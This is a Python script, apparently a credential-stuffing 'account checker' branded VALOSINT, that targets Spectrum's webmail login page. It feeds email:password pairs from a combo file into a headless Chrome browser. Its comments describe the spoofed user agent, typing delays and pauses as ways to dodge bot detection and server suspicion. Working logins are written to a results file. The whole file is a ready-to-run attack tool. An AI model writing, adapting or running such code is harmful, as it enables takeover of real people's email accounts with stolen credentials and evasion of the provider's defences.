import time
import os
from datetime import datetime
from colorama import Fore, init
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Inisialisasi warna terminal
init(autoreset=True)

class ValosintSelenium:
    def __init__(self):
        self.valid_count = 0
        self.bad_count = 0
        self.error_count = 0

    def _get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def _display_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.CYAN}██    ██  █████  ██       ██████  ███████ ██ ███    ██ ████████ ")
        print(f"{Fore.CYAN}██    ██ ██   ██ ██      ██    ██ ██      ██ ████   ██    ██    ")
        print(f"{Fore.CYAN}██    ██ ███████ ██      ██    ██ ███████ ██ ██ ██  ██    ██    ")
        print(f"{Fore.CYAN} ██  ██  ██   ██ ██      ██    ██      ██ ██ ██  ██ ██    ██    ")
        print(f"{Fore.CYAN}  ████   ██   ██ ███████  ██████  ███████ ██ ██   ████    ██    ")
        print("")
        print(f"               {Fore.WHITE}spectrum_account_checker • VALOSINT SCRIPT")
        print(f"              {Fore.CYAN}◇ SELENIUM ENGINE ◇ ANTI-CAPTCHA BYPASS ◇")
        print("")
        print(f"                         {Fore.BLUE}╭──────────────╮")
        print(f"                         {Fore.CYAN}│ {Fore.WHITE}PROJECT_VALO {Fore.CYAN}│")
        print(f"                         {Fore.BLUE}╰──────────────╯")
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
        print(f"{Fore.GREEN}Target      {Fore.WHITE}: webmail.spectrum.net")
        print(f"{Fore.GREEN}Engine      {Fore.WHITE}: Chromium WebDriver (Headless)")
        print(f"{Fore.GREEN}Script Name {Fore.WHITE}: spectrum_checker_SELENIUM_V1")
        print(f"{Fore.GREEN}Started At  {Fore.WHITE}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")

    def setup_driver(self):
        # Konfigurasi khusus agar Chrome bisa jalan di Termux HP tanpa error
        chrome_options = Options()
        chrome_options.add_argument("--headless") # Jalan di latar belakang
        chrome_options.add_argument("--no-sandbox") # Wajib untuk Linux/Termux
        chrome_options.add_argument("--disable-dev-shm-usage") # Mengatasi limitasi memori HP
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920,1080") # Resolusi Desktop
        chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
        
        # Inisialisasi WebDriver
        return webdriver.Chrome(options=chrome_options)

    def check_account(self, credential):
        if ":" not in credential: return
        email, password = credential.split(":")
        
        print(f"{Fore.YELLOW}[*] {self._get_time()} | Membuka browser untuk {email}...")
        
        driver = None
        try:
            driver = self.setup_driver()
            target_url = "https://webmail.spectrum.net/index.php/mail/auth"
            driver.get(target_url)

            # 1. Tunggu sampai kolom email muncul (Maksimal 15 detik)
            email_input = WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.NAME, "email"))
            )
            pass_input = driver.find_element(By.NAME, "password")

            # 2. Ketik pelan-pelan layaknya manusia (Bypass Deteksi Bot)
            email_input.clear()
            email_input.send_keys(email)
            time.sleep(0.5)
            pass_input.clear()
            pass_input.send_keys(password)
            time.sleep(1)

            # 3. Cari tombol Submit dan Klik
            try:
                submit_btn = driver.find_element(By.XPATH, "//button[@type='submit']")
                submit_btn.click()
            except:
                # Fallback jika bentuknya input bukan button
                submit_btn = driver.find_element(By.XPATH, "//input[@type='submit']")
                submit_btn.click()

            # 4. Tunggu loading hasil login (Beri waktu JS mengeksekusi)
            time.sleep(6) 

            # 5. Ambil hasil HTML dan URL terakhir setelah diklik
            current_url = driver.current_url.lower()
            page_source = driver.page_source.lower()
            ts = self._get_time()

            # 6. Validasi Akurat
            if "doesn't match our records" in page_source or "invalid" in page_source or "incorrect" in page_source or "auth_failed" in page_source:
                print(f"{Fore.RED}[{ts}] [DD]   {email} | Wrong Password/Not Match")
                self.bad_count += 1
            
            elif "/auth" not in current_url and ("inbox" in current_url or "mail" in current_url or "signout" in page_source):
                print(f"{Fore.GREEN}[{ts}] [LIVE] {email} | {password}")
                if not os.path.exists("results"): os.makedirs("results")
                with open("results/live.txt", "a") as f: f.write(f"{email}:{password}\n")
                self.valid_count += 1
            
            elif "locked" in page_source or "suspended" in page_source:
                print(f"{Fore.RED}[{ts}] [DD]   {email} | Account Locked")
                self.bad_count += 1
            
            else:
                # Jika masih nyangkut, cetak URL-nya
                print(f"{Fore.MAGENTA}[{ts}] [RETRY] {email} | Blocked at: {driver.current_url[:45]}...")
                self.error_count += 1

        except Exception as e:
            # Jika internet lambat atau web tidak meload
            print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email[:15]}... | Page Timeout / Element Not Found")
            self.error_count += 1
            
        finally:
            # SANGAT PENTING: Tutup browser agar HP tidak nge-hang
            if driver:
                driver.quit()

    def start(self):
        self._display_banner()

        combo_file = input(f"{Fore.WHITE}[?] Input Combo File [{Fore.CYAN}Enter for 'combo.txt'{Fore.WHITE}]: ").strip() or "combo.txt"
        
        print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Initializing Selenium Webdriver...")
        
        if not os.path.exists(combo_file):
            print(f"{Fore.RED}[!] {Fore.WHITE}System halt: Combo file '{combo_file}' not found.")
            return
            
        accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Loading {len(accounts)} accounts. Running on SINGLE-THREAD mode for stability.")
        time.sleep(1)
        print(f"{Fore.GREEN}[√] {Fore.WHITE}Terminal interface ready.")
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────\n")
        
        print(f"{Fore.GREEN}[√] CHECKER ONLINE")
        print(f"{Fore.WHITE}Press {Fore.MAGENTA}CTRL + C{Fore.WHITE} to stop the process.\n")

        if not accounts:
            print(f"{Fore.RED}[!] Database empty. Exiting.")
            return

        # Eksekusi Checker 1 per 1 (Single Thread agar Termux kuat)
        for acc in accounts:
            self.check_account(acc)
            # Jeda antar akun agar server tidak curiga
            time.sleep(2)

        print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
        print(f"{Fore.GREEN} [+] TOTAL LIVE : {self.valid_count}")
        print(f"{Fore.RED} [-] TOTAL DD   : {self.bad_count}")
        print(f"{Fore.MAGENTA} [!] RETRY/ERR  : {self.error_count}")
        print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
        print(f"{Fore.WHITE} Process finished. LIVE accounts saved in 'results/live.txt'")

if __name__ == "__main__":
    ValosintSelenium().start()
